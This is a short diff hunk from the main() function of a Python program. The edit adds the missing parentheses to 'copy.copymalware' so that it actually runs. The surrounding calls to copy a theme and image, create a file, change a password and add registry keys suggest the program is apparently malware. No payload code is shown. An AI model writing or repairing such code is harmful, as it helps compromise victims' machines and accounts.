@@ -84,7 +84,7 @@ def main(): #main func
 
         copy.copytheme()
         copy.copyimage()
-        copy.copymalware
+        copy.copymalware()
         system.createfile()
         system.changepasswrd()
         ###reg.addkeys
